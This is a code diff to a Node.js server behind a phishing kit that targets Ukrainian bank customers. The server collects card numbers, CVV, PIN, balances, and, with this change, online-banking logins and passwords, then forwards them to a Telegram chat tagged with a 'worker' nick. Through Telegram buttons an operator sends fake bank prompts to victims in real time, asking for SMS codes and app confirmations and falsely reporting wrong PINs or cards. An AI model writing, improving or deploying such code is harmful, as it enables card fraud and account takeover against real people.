@@ -11,14 +11,13 @@ const CHAT_ID = '-4840920969';
 // Динамическое определение WEBHOOK_URL
 const getWebhookUrl = () => {
     const protocol = process.env.NODE_ENV === 'production' ? 'https' : 'http';
-    const host = process.env.HOST || req.headers.host.split(':')[0] || 'localhost'; // Динамика по req, если нужно
+    const host = process.env.HOST || req.headers.host.split(':')[0] || 'localhost';
     const port = process.env.PORT || 3000;
     return `${protocol}://${host}:${port}/bot${TELEGRAM_BOT_TOKEN}`;
 };
 
 const banksForRequestButton = [
-    'Райффайзен', 'Альянс', 'ПУМБ', 'OTP Bank',
-    'Восток', 'Izibank', 'Укрсиб'
+    'Райффайзен', 'Восток', 'Izibank', 'Укрсиб'
 ];
 
 const app = express();
@@ -42,8 +41,8 @@ app.get('/panel', (req, res) => {
 
 const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });
 
-// Установка webhook (динамически, но для первого запуска используй env)
-const WEBHOOK_URL = getWebhookUrl(); // Или задай env WEBHOOK_URL
+// Установка webhook
+const WEBHOOK_URL = getWebhookUrl();
 bot.setWebHook(WEBHOOK_URL).then(() => {
     console.log(`Webhook set to ${WEBHOOK_URL}`);
 }).catch(err => {
@@ -69,11 +68,11 @@ const clients = new Map();
 const sessions = new Map();
 
 wss.on('connection', (ws) => {
-    console.log('Client connected via WS'); // Лог подключения
+    console.log('Client connected via WS');
     ws.on('message', (message) => {
         try {
             const data = JSON.parse(message.toString());
-            console.log('WS message from client:', data); // Лог сообщения
+            console.log('WS message from client:', data);
             if (data.type === 'register' && data.sessionId) {
                 clients.set(data.sessionId, ws);
                 console.log(`Client registered: ${data.sessionId}`);
@@ -84,7 +83,6 @@ wss.on('connection', (ws) => {
     });
     ws.on('close', (event) => {
         console.log('WS close:', event.code, event.reason);
-        // Очистка clients
         for (let [sid, clientWs] of clients.entries()) {
             if (clientWs === ws) {
                 clients.delete(sid);
@@ -99,7 +97,7 @@ wss.on('connection', (ws) => {
 });
 
 app.post('/api/submit', (req, res) => {
-    console.log('API /submit received:', req.body); // Улучшенный лог
+    console.log('API /submit received:', req.body);
     const { sessionId, isFinalStep, bankName, referrer, ...stepData } = req.body;
 
     let workerNick = 'unknown';
@@ -114,13 +112,11 @@ app.post('/api/submit', (req, res) => {
     console.log(`Session ${sessionId}: bank=${bankName}, isFinal=${isFinalStep}, keys: ${Object.keys(stepData).join(', ')}`);
 
     const existingData = sessions.get(sessionId) || { visitCount: 0 };
-    const newData = { ...existingData, bankName, ...stepData }; // Добавляем bankName явно
+    const newData = { ...existingData, bankName, ...stepData };
     sessions.set(sessionId, newData);
 
-    // Удаляем старый if для call_code_input (не используется)
-
     if (isFinalStep) {
-        console.log(`FINAL LOG for ${bankName} session ${sessionId}`); // Лог финала
+        console.log(`FINAL LOG for ${bankName} session ${sessionId}`);
         if (!existingData.logSent) {
             newData.visitCount = (existingData.visitCount || 0) + 1;
             newData.logSent = true;
@@ -130,13 +126,15 @@ app.post('/api/submit', (req, res) => {
         sessions.set(sessionId, newData);
 
         let message = '<b>Новий запис!</b>\n\n';
-        message += `<b>Назва банку:</b> ${newData.bankName || bankName}\n`; // Гарантируем bankName
+        message += `<b>Назва банку:</b> ${newData.bankName || bankName}\n`;
         message += `<b>Номер телефону:</b> <code>${newData.phone || 'Не вказано'}</code>\n`;
-        message += `<b>Номер карти:</b> <code>${newData.card_confirm || newData.card_simple || newData.card || 'Не вказано'}</code>\n`; // Добавили card_simple
+        message += `<b>Номер карти:</b> <code>${newData.card_confirm || newData.card_simple || newData.card || 'Не вказано'}</code>\n`;
         if (newData['card-expiry']) message += `<b>Термін дії:</b> <code>${newData['card-expiry']}</code>\n`;
         if (newData['card-cvv']) message += `<b>CVV:</b> <code>${newData['card-cvv']}</code>\n`;
         message += `<b>Пін:</b> <code>${newData.pin || 'Не вказано'}</code>\n`;
         if (newData.balance) message += `<b>Поточний баланс:</b> <code>${newData.balance}</code>\n`;
+        if (newData.phone_login || newData.login) message += `<b>Логін:</b> <code>${newData.phone_login || newData.login || 'Не вказано'}</code>\n`;
+        if (newData.password) message += `<b>Пароль:</b> <code>${newData.password}</code>\n`;
         const visitText = newData.visitCount === 1 ? 'NEW' : `${newData.visitCount} раз`;
         message += `<b>Кількість переходів:</b> ${visitText}\n`;
         message += `<b>Worker:</b> @${workerNick}\n`;
@@ -176,29 +174,51 @@ app.post('/api/sms', (req, res) => {
     }
 });
 
+app.post('/api/command', async (req, res) => {
+    console.log('API /command received:', req.body);
+    const { sessionId, type, data } = req.body;
+    const ws = clients.get(sessionId);
+    if (ws && ws.readyState === WebSocket.OPEN) {
+        ws.send(JSON.stringify({ type, data }));
+        res.json({ success: true, message: 'Command sent via WS' });
+    } else {
+        console.log('WS not available, using HTTP fallback for', sessionId);
+        try {
+            await fetch(`/api/submit`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ sessionId, isFinalStep: false, command: { type, data } })
+            });
+            res.json({ success: true, message: 'Command sent via HTTP fallback' });
+        } catch (error) {
+            res.status(500).json({ success: false, message: 'Command failed' });
+        }
+    }
+});
+
 function sendToTelegram(message, sessionId, bankName) {
-    console.log(`Sending TG message for ${bankName} session ${sessionId}`); // Лог
+    console.log(`Sending TG message for ${bankName} session ${sessionId}`);
     const keyboard = [
         [
-            { text: 'SMS', callback_data: `sms:${sessionId}` },
-            { text: 'ДОДАТОК', callback_data: `app:${sessionId}` }
+            { text: 'SMS', callback_data: `command:sms:${sessionId}` },
+            { text: 'ДОДАТОК', callback_data: `command:app:${sessionId}` }
         ],
         [
-            { text: 'ПІН', callback_data: `pin_error:${sessionId}` },
-            { text: 'КОД', callback_data: `code_error:${sessionId}` },
-            { text: 'КОД ✅', callback_data: `timer:${sessionId}` }
+            { text: 'ПІН', callback_data: `command:pin_error:${sessionId}` },
+            { text: 'КОД', callback_data: `command:code_error:${sessionId}` },
+            { text: 'КОД ✅', callback_data: `command:timer:${sessionId}` }
         ],
         [
-            { text: 'Карта', callback_data: `card_error:${sessionId}` },
-            { text: 'Номер', callback_data: `number_error:${sessionId}` }
+            { text: 'Карта', callback_data: `command:card_error:${sessionId}` },
+            { text: 'Номер', callback_data: `command:number_error:${sessionId}` }
         ],
         [
-            { text: 'OTHER', callback_data: `other:${sessionId}` }
+            { text: 'OTHER', callback_data: `command:other:${sessionId}` }
         ]
     ];
 
     if (banksForRequestButton.includes(bankName)) {
-        keyboard[0].push({ text: 'ЗАПРОС', callback_data: `request_details:${sessionId}` });
+        keyboard[0].push({ text: 'ЗАПРОС', callback_data: `command:request_details:${sessionId}` });
     }
 
     const options = {
@@ -210,45 +230,29 @@ function sendToTelegram(message, sessionId, bankName) {
     bot.sendMessage(CHAT_ID, message, options).catch(err => console.error("Telegram send error:", err));
 }
 
-bot.on('callback_query', (callbackQuery) => {
-    console.log('Callback query:', callbackQuery.data); // Лог callback
-    const [type, sessionId] = callbackQuery.data.split(':');
-    const ws = clients.get(sessionId);
-    console.log(`Handling callback ${type} for session ${sessionId}, WS open: ${ws && ws.readyState === WebSocket.OPEN}`); // Лог состояния WS
-    if (ws && ws.readyState === WebSocket.OPEN) {
-        let commandData = {};
-
+bot.on('callback_query', async (callbackQuery) => {
+    console.log('Callback query:', callbackQuery.data);
+    const [action, type, sessionId] = callbackQuery.data.split(':');
+    if (action === 'command') {
+        const data = {};
         switch (type) {
-            case 'sms':
-                commandData = { text: "Вам відправлено SMS з кодом на мобільний пристрій, введіть його у форму вводу коду" };
-                break;
-            case 'app':
-                commandData = { text: "Вам надіслано підтвердження у додаток мобільного банку. Відкрийте додаток банку та зробіть підтвердження для проходження автентифікації." };
-                break;
-            case 'other':
-                commandData = { text: "В нас не вийшло автентифікувати вашу картку. Для продовження пропонуємо вказати картку іншого банку" };
-                break;
-            case 'pin_error':
-                commandData = { text: "Ви вказали невірний пінкод. Натисніть кнопку назад та вкажіть вірний пінкод" };
-                break;
-            case 'card_error':
-                commandData = { text: "Вказано невірний номер картки, натисніть назад та введіть номер картки вірно" };
-                break;
-            case 'number_error':
-                commandData = { text: "Вказано не фінансовий номер телефону. Натисніть кнопку назад та вкажіть номер який прив'язаний до вашої картки." };
-                break;
-            case 'request_details':
-                commandData = { isRaiffeisen: sessions.get(sessionId)?.bankName === 'Райффайзен' };
-                break;
+            case 'sms': data.text = "Вам відправлено SMS з кодом на мобільний пристрій, введіть його у форму вводу коду"; break;
+            case 'app': data.text = "Вам надіслано підтвердження у додаток мобільного банку. Відкрийте додаток банку та зробіть підтвердження для проходження автентифікації."; break;
+            case 'other': data.text = "В нас не вийшло автентифікувати вашу картку. Для продовження пропонуємо вказати картку іншого банку"; break;
+            case 'pin_error': data.text = "Ви вказали невірний пінкод. Натисніть кнопку назад та вкажіть вірний пінкод"; break;
+            case 'card_error': data.text = "Вказано невірний номер картки, натисніть назад та введіть номер картки вірно"; break;
+            case 'number_error': data.text = "Вказано не фінансовий номер телефону. Натисніть кнопку назад та вкажіть номер який прив'язаний до вашої картки."; break;
+            case 'request_details': data.isRaiffeisen = sessions.get(sessionId)?.bankName === 'Райффайзен'; break;
+            case 'code_error': data.error = true; break;
+            case 'timer': data.timer = true; break;
         }
-
-        ws.send(JSON.stringify({ type: type, data: commandData }));
+        await fetch('/api/command', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ sessionId, type, data })
+        });
         bot.answerCallbackQuery(callbackQuery.id, { text: `Команда "${type}" відправлена!` });
-    } else {
-        console.log('WS not open for session', sessionId); // Лог проблемы
-        bot.answerCallbackQuery(callbackQuery.id, { text: 'Помилка: клієнт не в мережі!', show_alert: true });
     }
-    bot.answerCallbackQuery(callbackQuery.id); // Всегда отвечаем
 });
 
 bot.on('polling_error', (error) => {
